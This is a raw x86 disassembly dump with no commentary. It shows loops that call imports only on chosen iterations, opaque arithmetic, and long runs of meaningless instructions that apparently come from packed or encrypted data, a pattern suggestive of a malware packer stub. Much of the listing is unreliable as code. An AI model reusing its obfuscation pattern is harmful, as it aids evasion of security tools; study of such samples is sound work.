  40a0de:	cmp    DWORD PTR ds:0x42a891,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a7ad
  40a106:	mov    eax,ds:0x42a889
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a875
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a8b1
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a781,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a781
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a781,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a781,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a781,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a781,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a781
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a781,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7dd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0xb160,0x24
  40a1b4:	dec    ebp
  40a1b5:	and    eax,0x7878f9e2
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	add    esp,DWORD PTR [edi+0x2b]
  40a1c1:	push   edi
  40a1c2:	popa   
  40a1c3:	rol    BYTE PTR [ebx-0x7b],0x28
  40a1c7:	mov    esp,0xca88e490
  40a1cc:	cmp    eax,0xd5c3470c
  40a1d1:	sub    bh,BYTE PTR [edi]
  40a1d3:	stos   BYTE PTR es:[edi],al
  40a1d4:	push   ebp
  40a1d5:	daa    
  40a1d6:	inc    esi
  40a1d7:	in     eax,0x73
  40a1d9:	icebp  
  40a1da:	pop    edx
  40a1db:	xor    bl,BYTE PTR [ecx+edi*1]
  40a1de:	pushf  
  40a1df:	adc    ch,bl
  40a1e1:	pop    esp
  40a1e2:	pop    esp
  40a1e3:	cmp    al,0xd8
  40a1e5:	daa    
  40a1e6:	mov    dh,0x4
  40a1e8:	xchg   ebp,eax
  40a1e9:	inc    edx
  40a1ea:	fwait
  40a1eb:	inc    edi
  40a1ec:	push   ss
  40a1ed:	(bad)  
  40a1ee:	jmp    0x1aeaafeb
  40a1f3:	pop    esi
  40a1f4:	inc    DWORD PTR [edi+0x6264b304]
  40a1fa:	or     ah,BYTE PTR [esi]
  40a1fc:	inc    ebx
  40a1fd:	pushf  
  40a1fe:	hlt    
  40a1ff:	adc    bh,BYTE PTR [esi]
  40a201:	(bad)  
  40a202:	adc    ecx,DWORD PTR [ebx-0x38]
  40a205:	sub    bh,BYTE PTR [ebx+0x68]
  40a208:	inc    eax
  40a209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20a:	mov    ds:0x6a4430f7,eax
  40a20f:	xor    eax,0x98a4d679
  40a214:	out    0x2c,al
  40a216:	icebp  
  40a217:	call   0xc30b:0x3b088394
  40a21e:	in     eax,0x4
  40a220:	dec    esi
  40a221:	mov    dh,0x82
  40a223:	jmp    0xa4bd:0xc69640f8
  40a22a:	xchg   ecx,eax
  40a22b:	add    eax,0xe8db7079
  40a230:	pop    ecx
  40a231:	adc    dl,bl
  40a233:	push   esi
  40a234:	mov    dh,0xb7
  40a236:	fdiv   QWORD PTR [esi]
  40a238:	sbb    DWORD PTR [ebp+0x2cf75a7f],eax
  40a23e:	push   ebp
  40a23f:	and    BYTE PTR [edx-0x80],ch
  40a242:	sub    DWORD PTR gs:[ecx],ecx
  40a245:	ret    
  40a246:	adc    DWORD PTR [eax-0x1eea37ac],esi
  40a24c:	fcmovu st,st(7)
  40a24e:	retf   0xd10b
  40a251:	pop    ebp
  40a252:	jae    0x40a1d7
  40a254:	test   al,0xe2
  40a256:	(bad)  
  40a257:	lods   eax,DWORD PTR ds:[esi]
  40a258:	add    DWORD PTR [ebp-0x61],ebp
  40a25b:	sti    
  40a25c:	leave  
  40a25d:	sub    BYTE PTR [ecx-0x77],cl
  40a260:	mov    ds:0xf243443,al
  40a265:	pop    edx
  40a266:	fild   QWORD PTR [edx+0x36]
  40a269:	xchg   edi,eax
  40a26a:	fs ds and eax,0xded34a56
  40a271:	adc    bh,BYTE PTR [eax+0x36]
  40a274:	mov    edx,0xe3952a38
  40a279:	(bad)  
  40a27a:	adc    eax,0x8f0dec4e
  40a27f:	dec    esi
  40a280:	rcl    BYTE PTR [ecx+esi*8],0x6b
  40a284:	sub    bl,BYTE PTR [esi+0x64f9568e]
  40a28a:	fwait
  40a28b:	push   ebx
  40a28c:	in     eax,0x9a
  40a28e:	and    bh,BYTE PTR [ecx]
  40a290:	sbb    al,0x72
  40a292:	stos   BYTE PTR es:[edi],al
  40a293:	lods   al,BYTE PTR ds:[esi]
  40a294:	mov    bl,0x80
  40a296:	sbb    al,0x6c
  40a298:	sbb    si,sp
  40a29b:	pop    edi
  40a29c:	inc    esi
  40a29d:	adc    edi,esi
  40a29f:	loopne 0x40a26c
  40a2a1:	aas    
  40a2a2:	sub    BYTE PTR [ebp+0x1f754289],dl
  40a2a8:	xor    al,0xff
  40a2aa:	pop    eax
  40a2ab:	lahf   
  40a2ac:	sar    DWORD PTR [ecx+0x52],0x6d
  40a2b0:	leave  
  40a2b1:	and    DWORD PTR [eax],eax
  40a2b3:	out    0xca,eax
  40a2b5:	jns    0x40a288
  40a2b7:	test   dl,al
  40a2b9:	and    bl,bh
  40a2bb:	mov    dl,0xcc
  40a2bd:	fldcw  WORD PTR [edx-0x5ccf627c]
  40a2c3:	aaa    
  40a2c4:	inc    ebx
  40a2c5:	repz out dx,al
  40a2c7:	add    ebp,esi
  40a2c9:	(bad)  ds:[edx-0xe5faa96]
  40a2d0:	xchg   DWORD PTR [edx-0x13da93a2],esi
  40a2d6:	je     0x40a32e
  40a2d8:	jns    0x40a281
  40a2da:	jge    0x40a2a5
  40a2dc:	xchg   BYTE PTR [edx+0x61],ah
  40a2df:	pop    ebx
  40a2e0:	mov    ebp,0x8e9979f4
  40a2e5:	dec    ebx
  40a2e6:	jg     0x40a2f5
  40a2e8:	loop   0x40a301
  40a2ea:	lock ins BYTE PTR es:[edi],dx
  40a2ec:	sub    eax,ecx
  40a2ee:	fadd   DWORD PTR [eax+0x3cd4bcdb]
  40a2f4:	jg     0x40a32d
  40a2f6:	add    bh,BYTE PTR [ecx]
  40a2f8:	loop   0x40a355
  40a2fa:	jp     0x40a2af
  40a2fc:	fs inc ebp
  40a2fe:	loopne 0x40a2fb
  40a300:	cmc    
  40a301:	lock jge 0x40a29c
  40a304:	sub    ecx,DWORD PTR [di]
  40a307:	outs   dx,DWORD PTR ds:[esi]
  40a308:	(bad)  
  40a309:	xor    eax,DWORD PTR [edx]
  40a30b:	aad    0x90
  40a30d:	sub    DWORD PTR [eax],ecx
  40a30f:	dec    ecx
  40a310:	cmp    eax,0x1a32ca86
  40a315:	pop    ss
  40a316:	push   es
  40a317:	mov    eax,0xfda25aee
  40a31c:	and    edx,DWORD PTR [ebx]
  40a31e:	xchg   ebp,eax
  40a31f:	fcomp  QWORD PTR [ebp-0x3e1b72e]
  40a325:	add    BYTE PTR [eax-0x2],ch
  40a328:	xchg   edi,eax
  40a329:	test   BYTE PTR [eax],0xdf
  40a32c:	scas   al,BYTE PTR es:[edi]
  40a32d:	rcr    DWORD PTR [edi-0x80],cl
  40a330:	mov    BYTE PTR [ecx],bl
  40a332:	pusha  
  40a333:	loope  0x40a33c
  40a335:	xchg   esi,eax
  40a336:	int    0xdc
  40a338:	dec    edi
  40a339:	mov    BYTE PTR [ebp+0x39bdfc1e],cl
  40a33f:	(bad)
  40a342:	jp     0x40a3aa
  40a344:	lahf   
  40a345:	xlat   BYTE PTR ds:[ebx]
  40a346:	cmp    DWORD PTR [edi+edi*2-0x19b77062],0xc18b14b8
  40a351:	les    ebx,FWORD PTR [edi]
  40a353:	dec    esi
  40a354:	out    0xf8,eax
  40a356:	push   cs
  40a357:	jbe    0x40a36c
  40a359:	jnp    0x40a387
  40a35b:	xchg   BYTE PTR [edi],bh
  40a35d:	(bad)  
  40a35e:	jno    0x40a31b
  40a360:	xchg   ah,ah
  40a362:	fbld   TBYTE PTR [ecx]
  40a364:	(bad)  
  40a365:	inc    BYTE PTR [eax+0x65]
  40a368:	jno    0x40a350
  40a36a:	mov    dh,0xe6
  40a36c:	mov    WORD PTR [ebx+0x7e],gs
  40a36f:	in     al,dx
  40a370:	fdiv   DWORD PTR [ebp+ebp*4+0x56]
  40a374:	stc    
  40a375:	mov    al,ds:0x5050fa3d
  40a37a:	cmp    DWORD PTR [edx+0x55df40b8],esp
  40a380:	mov    eax,0x5cc504bb
  40a385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a386:	pop    edi
  40a387:	add    eax,ebx
  40a389:	pop    ds
  40a38a:	mov    al,0x74
  40a38c:	gs cli 
  40a38e:	add    eax,0xb8ac46e3
  40a393:	lds    eax,FWORD PTR [eax]
  40a395:	xchg   ecx,eax
  40a396:	dec    esp
  40a397:	es int3 
  40a399:	jmp    0xebb4:0x5b0de3f1
  40a3a0:	sahf   
  40a3a1:	jge    0x40a409
  40a3a3:	shr    BYTE PTR [eiz*1-0x3ab3f445],cl
  40a3aa:	mov    esi,0x62ffae9e
  40a3af:	jp     0x40a38d
  40a3b1:	(bad)  
  40a3b2:	xor    eax,0x8d74e574
  40a3b7:	(bad)  
  40a3b9:	mov    dh,BYTE PTR [eax]
  40a3bb:	pop    esi
  40a3bc:	inc    ebx
  40a3bd:	sbb    al,0xc2
  40a3bf:	shl    BYTE PTR [ecx-0x6dc5559d],cl
  40a3c5:	mov    ah,0xc4
  40a3c7:	dec    ecx
  40a3c8:	std    
  40a3c9:	loop   0x40a38d
  40a3cb:	adc    ecx,ebx
  40a3cd:	test   DWORD PTR ss:[eax+0x44],0x3e1fe910
  40a3d5:	imul   edx,DWORD PTR [eax],0x49
  40a3d8:	inc    esp
  40a3d9:	or     al,0x61
  40a3db:	outs   dx,BYTE PTR ds:[esi]
  40a3dc:	push   esp
  40a3dd:	stos   BYTE PTR es:[edi],al
  40a3de:	xlat   BYTE PTR ds:[ebx]
  40a3df:	inc    ebx
  40a3e0:	and    DWORD PTR [esi+0x1c],eax
  40a3e3:	lds    edx,FWORD PTR [edx-0x40ed7a23]
  40a3e9:	sbb    DWORD PTR [edx+ebp*2+0xce06a9d],edi
  40a3f0:	jge    0x40a3be
  40a3f2:	dec    eax
  40a3f4:	pop    ebp
  40a3f5:	sbb    edi,DWORD PTR [eax-0x35a8c809]
  40a3fb:	stos   DWORD PTR es:[edi],eax
  40a3fc:	xchg   esi,eax
  40a3fd:	add    DWORD PTR [eax-0x609ca7d2],ecx
  40a403:	(bad)  
  40a404:	dec    ebp
  40a405:	popf   
  40a406:	xchg   DWORD PTR [edx+0x27],ebp
  40a409:	mov    eax,0xca5ff0d5
  40a40e:	popf   
  40a40f:	mov    eax,0x8fb73a81
  40a414:	push   ss
  40a415:	in     al,dx
  40a416:	mov    esi,0x98534495
  40a41b:	jmp    0xb63e0b27
  40a420:	jno    0x40a491
  40a422:	jnp    0x40a3f3
  40a424:	inc    ebx
  40a425:	jbe    0x40a3c7
  40a427:	pushf  
  40a428:	mov    edx,0x4d30fe9e
  40a42d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a42e:	cmc    
  40a42f:	xor    DWORD PTR [edi],edi
  40a431:	(bad)  
  40a432:	add    eax,0xa3153ab7
  40a437:	mov    ch,0x43
  40a439:	rcl    BYTE PTR [edi-0x3a],cl
  40a43c:	xor    DWORD PTR [ebp-0x2],eax
  40a43f:	jns    0x40a3c9
  40a441:	ret    
  40a442:	pop    edx
  40a443:	test   BYTE PTR [eax],al
  40a445:	mov    es,WORD PTR [edi+0x5a]
  40a448:	inc    edi
  40a449:	aam    0x98
  40a44b:	jg     0x40a3fe
  40a44d:	sbb    eax,esi
  40a44f:	popa   
  40a450:	call   0x7f29:0xc0acfe41
  40a457:	std    
  40a458:	ins    DWORD PTR es:[edi],dx
  40a459:	loop   0x40a435
  40a45b:	into   
  40a45c:	call   0xef64:0x2c9c70c9
  40a463:	add    edx,ebp
  40a465:	test   eax,0x213deb62
  40a46a:	sub    edi,esi
  40a46c:	push   0x210a9ca9
  40a471:	sbb    ecx,DWORD PTR cs:[ecx-0x1]
  40a475:	add    ecx,DWORD PTR [ebx+ecx*4+0xa37cbf2]
  40a47c:	arpl   WORD PTR [ebx-0x9ae32db],bx
  40a482:	sahf   
  40a483:	and    BYTE PTR [ebp+ebp*2-0x39a79da9],al
  40a48a:	cdq    
  40a48b:	jecxz  0x40a460
  40a48d:	cdq    
  40a48e:	cmp    ah,ah
  40a490:	pop    ss
  40a491:	repnz adc BYTE PTR [esi-0x3b],0x7
  40a496:	jnp    0x40a429
  40a498:	packsswb mm5,QWORD PTR [eax-0x3c98b047]
  40a49f:	sub    esp,DWORD PTR [edx+0x7c]
  40a4a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4a3:	mov    bh,0x78
  40a4a5:	jnp    0x40a4c3
  40a4a7:	sbb    al,0xa1
  40a4a9:	loopne 0x40a4c2
  40a4ab:	inc    eax
  40a4ac:	mul    bl
  40a4ae:	bound  dx,DWORD PTR [ebx]
  40a4b1:	lods   al,BYTE PTR ds:[esi]
  40a4b2:	retf   
  40a4b3:	or     BYTE PTR [esi+0x52],0x70
  40a4b7:	cwde   
  40a4b8:	pop    edx
  40a4b9:	fisttp DWORD PTR [ebp+0x2581dc45]
  40a4bf:	in     eax,dx
  40a4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c1:	inc    edx
  40a4c2:	add    BYTE PTR ds:0x890042a8,dl
  40a4c8:	inc    ebp
  40a4c9:	fadd   DWORD PTR [ecx+0x42a8a92d]
  40a4cf:	add    al,dl
  40a4d1:	xor    BYTE PTR [eax],al
  40a4d3:	add    BYTE PTR [ebx-0x367ef7bb],cl
  40a4d9:	mov    al,ds:0x8900003b
  40a4de:	inc    ebp
  40a4df:	loopne 0x40a462
  40a4e1:	and    eax,0x42a791
  40a4e6:	add    BYTE PTR [eax],al
  40a4e8:	add    BYTE PTR [eax],al
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a791
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a791,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a791,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a791,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a791
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a791,ecx
  40a527:	cmp    DWORD PTR ds:0x42a791,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a7bd
  40a53e:	mov    ecx,DWORD PTR ds:0x42a871
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a8a1,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a8a1
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a8a1,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a8a1,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a8a1,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a869,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a869
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a869,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a869,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa82
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a869,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a869
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a869,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a869,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x1c],dh
  40a61b:	repz mov ebx,0x78fedebb
  40a621:	js     0x40a697
  40a623:	jle    0x40a69d
  40a625:	js     0x40a632
  40a627:	cld    
  40a628:	jmp    0x40a64b
  40a62a:	mov    fs,WORD PTR [eax+0x70391dd]
  40a630:	jmp    0x7a7b8958
  40a635:	stc    
  40a636:	pop    ebp
  40a637:	cdq    
  40a638:	pop    es
  40a639:	ret    
  40a63a:	mov    al,bh
  40a63c:	mov    eax,ds:0x18f4e417
  40a641:	or     esi,DWORD PTR [edi-0x53badbc4]
  40a647:	fld    TBYTE PTR [ebx+0x3f989e1c]
  40a64d:	pushf  
  40a64e:	xchg   esi,eax
  40a64f:	pop    edi
  40a650:	fwait
  40a651:	fs retw 
  40a654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a655:	ret    0x1260
  40a658:	scas   eax,DWORD PTR es:[edi]
  40a659:	cmp    al,0xc8
  40a65b:	inc    esp
  40a65c:	inc    edi
  40a65d:	call   0x828258fd
  40a662:	scas   al,BYTE PTR es:[edi]
  40a663:	fistp  QWORD PTR [edx-0x5d]
  40a666:	mov    ebp,DWORD PTR [edi+0x3b8b4d04]
  40a66c:	cdq    
  40a66d:	mov    cl,0x36
  40a66f:	call   0xb56f:0x8636aa1c
  40a676:	popf   
  40a677:	pop    es
  40a678:	mov    edi,0xa0ee0622
  40a67d:	or     ecx,DWORD PTR [esi]
  40a67f:	xor    esp,esi
  40a681:	adc    al,0xf0
  40a683:	test   eax,0xb4dd1b
  40a688:	adc    DWORD PTR [eax+0x18d4c06],edx
  40a68e:	mov    BYTE PTR [esi+edi*1],bl
  40a691:	xchg   ebx,eax
  40a692:	arpl   WORD PTR [ebx+esi*8-0x79],bx
  40a696:	in     eax,0x5b
  40a698:	sub    ebp,DWORD PTR [eax-0x2e]
  40a69b:	test   eax,0xeed56186
  40a6a0:	push   ecx
  40a6a1:	in     al,dx
  40a6a2:	pop    ecx
  40a6a3:	(bad)  
  40a6a4:	out    dx,eax
  40a6a5:	or     dl,BYTE PTR [ebx+0x446243e3]
  40a6ab:	dec    edi
  40a6ac:	cmp    DWORD PTR [esi+0x3e],esp
  40a6af:	add    eax,DWORD PTR [edx-0x338d9e1c]
  40a6b5:	ret    
  40a6b6:	sbb    eax,eax
  40a6b8:	pop    ss
  40a6b9:	mov    ecx,0xf427ba56
  40a6be:	sub    DWORD PTR [edi-0x797b2518],eax
  40a6c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6c5:	xlat   BYTE PTR ds:[ebx]
  40a6c6:	pop    ecx
  40a6c7:	inc    edx
  40a6c8:	xor    DWORD PTR [edi+0x1ec2846c],ebx
  40a6ce:	push   esi
  40a6cf:	gs aam 0x75
  40a6d2:	inc    esp
  40a6d3:	mov    al,ds:0x532a7700
  40a6d8:	push   cs
  40a6d9:	push   esi
  40a6da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6db:	xchg   edi,eax
  40a6dc:	add    al,0x7d
  40a6de:	loopne 0x40a71c
  40a6e0:	fwait
  40a6e1:	push   edx
  40a6e2:	xchg   edi,eax
  40a6e3:	jl     0x40a6cd
  40a6e5:	popf   
  40a6e6:	pop    ebp
  40a6e7:	lods   al,BYTE PTR ds:[esi]
  40a6e8:	sub    BYTE PTR [ebp-0x79],dh
  40a6eb:	sub    DWORD PTR [edx+0x7d8eed28],esi
  40a6f1:	mov    bl,0xe4
  40a6f3:	mov    cl,0x14
  40a6f5:	rcr    BYTE PTR [edi+ebp*2+0x55],cl
  40a6f9:	xor    ch,ah
  40a6fb:	sar    DWORD PTR [eax+0x375b9de6],cl
  40a701:	push   esi
  40a702:	jno    0x40a6b6
  40a704:	mov    eax,ds:0x7d414c92
  40a709:	pop    ebx
  40a70a:	rol    ebp,1
  40a70c:	imul   edx,DWORD PTR [ebp-0x2c],0xfffffff4
  40a710:	mov    ds,WORD PTR [ebx]
  40a712:	mov    al,ds:0x75c3a205
  40a717:	dec    edi
  40a718:	jae    0x40a6de
  40a71a:	cmp    bh,bl
  40a71c:	sbb    ebp,DWORD PTR [edi-0x1c]
  40a71f:	cli    
  40a720:	add    DWORD PTR [ebp+0x34],edx
  40a723:	aaa    
  40a724:	push   es
  40a725:	dec    DWORD PTR [esi+ecx*4-0x33731207]
  40a72c:	xchg   DWORD PTR [edi+ecx*2-0x2560f8ae],eax
  40a733:	shl    BYTE PTR [ebx],cl
  40a735:	jno    0x40a735
  40a737:	xchg   BYTE PTR [edi+esi*1-0x4],ch
  40a73b:	jno    0x40a712
  40a73d:	test   al,0x17
  40a73f:	push   esp
  40a740:	adc    eax,0x643046a0
  40a745:	jmp    0x40a760
  40a747:	int3   
  40a748:	(bad)  
  40a749:	pop    ecx
  40a74a:	popa   
  40a74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a74c:	nop
  40a74d:	js     0x40a70b
  40a74f:	push   ss
  40a750:	push   0x1f1e318a
  40a755:	pop    es
  40a756:	sub    BYTE PTR [ebx-0x2],cl
  40a759:	or     bh,0x56
  40a75c:	mov    eax,0xb6ffbb82
  40a761:	add    BYTE PTR [edi+ecx*8+0x21],cl
  40a765:	call   0xc28a:0x21d821e4
  40a76c:	jns    0x40a7b4
  40a76e:	cmc    
  40a76f:	out    dx,eax
  40a770:	adc    esp,ecx
  40a772:	adc    esp,edi
  40a774:	jle    0x40a7a4
  40a776:	mov    cl,0xcf
  40a778:	dec    edi
  40a779:	jmp    0x2fc71f72
  40a77e:	dec    eax
  40a77f:	dec    ebp
  40a780:	aad    0xc4
  40a782:	out    dx,eax
  40a783:	sbb    ecx,DWORD PTR [edi]
  40a785:	(bad)  
  40a786:	jle    0x40a714
  40a788:	push   es
  40a789:	or     eax,0x23f0c47a
  40a78e:	mov    DWORD PTR [ecx-0x6cee2b19],esp
  40a794:	aad    0x16
  40a796:	and    dh,dh
  40a798:	xchg   dh,bl
  40a79a:	xor    al,0xdf
  40a79c:	adc    dh,dh
  40a79e:	xchg   ecx,eax
  40a79f:	and    eax,0x9b2cae65
  40a7a4:	mov    dh,0xb5
  40a7a6:	rol    DWORD PTR [edi],1
  40a7a8:	dec    edx
  40a7a9:	xor    al,0x33
  40a7ab:	push   edx
  40a7ac:	sti    
  40a7ad:	imul   BYTE PTR [edi+eiz*2]
  40a7b0:	sti    
  40a7b1:	bound  edx,QWORD PTR [edi-0x46]
  40a7b4:	mov    dl,0xa3
  40a7b6:	mov    al,0x1d
  40a7b8:	xchg   ebp,eax
  40a7b9:	pop    ecx
  40a7ba:	dec    ebp
  40a7bb:	inc    ecx
  40a7bc:	sbb    eax,0x7b3fe419
  40a7c1:	xor    ch,BYTE PTR [eax+eiz*1-0xf]
  40a7c5:	and    al,BYTE PTR [edx+ebp*8]
  40a7c8:	shl    BYTE PTR [edx+0x75],0xc
  40a7cc:	mov    ss:0x985df1a0,eax
  40a7d2:	add    edx,DWORD PTR [edx+esi*2-0xb902da]
  40a7d9:	xbegin 0x51e5dfc6
  40a7df:	and    BYTE PTR ds:0xa44998aa,bh
  40a7e5:	mov    al,0x7e
  40a7e7:	(bad)  
  40a7e8:	dec    eax
  40a7e9:	hlt    
  40a7ea:	add    eax,0x39a8747c
  40a7ef:	sahf   
  40a7f0:	fsub   DWORD PTR [esi+0x23a26dc4]
  40a7f6:	bound  ebx,QWORD PTR [edi-0x5]
  40a7f9:	xchg   edx,eax
  40a7fa:	(bad)  
  40a7fb:	out    0xd7,eax
  40a7fd:	lea    edx,[edx+0x54]
  40a800:	dec    ecx
  40a801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a802:	or     eax,0x8253a46b
  40a807:	lds    ebp,FWORD PTR [edx-0x5f]
  40a80a:	test   al,0xf9
  40a80c:	xor    BYTE PTR [ecx],0x28
  40a80f:	pop    edx
  40a810:	sub    eax,0xd5aa984c
  40a815:	cmp    BYTE PTR [edx],ch
  40a817:	call   0xc176ceb2
  40a81c:	inc    eax
  40a81d:	or     eax,0x54e4ba4f
  40a822:	jge    0x40a7d5
  40a824:	adc    al,0xa3
  40a826:	mov    bl,0x13
  40a828:	jb     0x40a7db
  40a82a:	sbb    DWORD PTR [ebp+0x5a],edx
  40a82d:	(bad)  
  40a82e:	push   eax
  40a82f:	retf   
  40a830:	lods   eax,DWORD PTR ds:[esi]
  40a831:	popf   
  40a832:	xchg   edx,eax
  40a833:	cmp    BYTE PTR [ebp+ecx*8+0x51],ch
  40a837:	call   0xcd368f4b
  40a83c:	lahf   
  40a83d:	call   0x76ea:0xb41f0e59
  40a844:	xor    BYTE PTR [ebp+0x38],dh
  40a847:	add    eax,esi
  40a849:	pop    esi
  40a84a:	or     BYTE PTR [edx+ebx*2],bh
  40a84d:	mov    dl,BYTE PTR [edi]
  40a84f:	add    eax,0x6fedeeef
  40a854:	xchg   ebp,eax
  40a855:	push   0x7d600f86
  40a85a:	addr16 out 0xbf,eax
  40a85d:	cmp    al,0xd0
  40a85f:	jmp    0xbf9:0x9a95f3de
  40a866:	aad    0x6f
  40a868:	std    
  40a869:	push   esi
  40a86a:	mov    al,0x44
  40a86c:	ret    
  40a86d:	lahf   
  40a86e:	sub    eax,0x54fb501e
  40a873:	(bad)  
  40a874:	push   ss
  40a875:	add    eax,0x356e5a4
  40a87a:	dec    ebx
  40a87b:	outs   dx,BYTE PTR ds:[esi]
  40a87c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a87d:	mov    bh,0xfb
  40a87f:	cmp    cl,BYTE PTR [eax]
  40a881:	out    dx,eax
  40a882:	adc    DWORD PTR [esi],ecx
  40a884:	or     DWORD PTR [esi-0x7369362c],ebp
  40a88a:	and    eax,0x803fed36
  40a88f:	push   cs
  40a890:	xor    cl,BYTE PTR [ecx+esi*8-0x2bd061c0]
  40a897:	nop
  40a898:	cdq    
  40a899:	scas   eax,DWORD PTR es:[di]
  40a89b:	mov    edx,0x55505bfd
  40a8a0:	(bad)  
  40a8a1:	sbb    eax,DWORD PTR [esi+0x60a4430b]
  40a8a7:	push   esp
  40a8a8:	aas    
  40a8a9:	mov    bh,0x16
  40a8ab:	adc    DWORD PTR [ecx+ecx*1-0x2d016b80],0xcf9e0ef0
  40a8b6:	ss push dx
  40a8b9:	add    eax,0x2c3c5c39
  40a8be:	adc    BYTE PTR [edx+0x74],dl
  40a8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8c2:	add    edx,DWORD PTR [eax]
  40a8c4:	mov    eax,0xe70e6012
  40a8c9:	out    0xad,al
  40a8cb:	fdivr  DWORD PTR [esi+0x11]
  40a8ce:	imul   ebp,ecx,0x4b
  40a8d1:	(bad)  
  40a8d2:	jnp    0x40a895
  40a8d4:	xor    BYTE PTR [ecx+0x45],bl
  40a8d7:	xchg   ebp,edi
  40a8d9:	ds xchg edx,eax
  40a8db:	push   ss
  40a8dc:	std    
  40a8dd:	pusha  
  40a8de:	das    
  40a8df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8e0:	and    DWORD PTR [ebx+edx*4],ebp
  40a8e3:	out    dx,al
  40a8e4:	cmp    ch,dh
  40a8e6:	xchg   edx,ebp
  40a8e8:	pop    ecx
  40a8e9:	addr16 add eax,0xc02db0e6
  40a8ef:	jae    0x40a94e
  40a8f1:	inc    ebx
  40a8f2:	fld    QWORD PTR [ecx]
  40a8f4:	popf   
  40a8f5:	inc    ecx
  40a8f6:	xor    ebp,esp
  40a8f8:	loop   0x40a920
  40a8fa:	push   0xffffffc3
  40a8fc:	inc    edi
  40a8fd:	push   eax
  40a8fe:	pminsw mm6,QWORD PTR [edi+0x66]
  40a902:	and    BYTE PTR [esi-0x44],ah
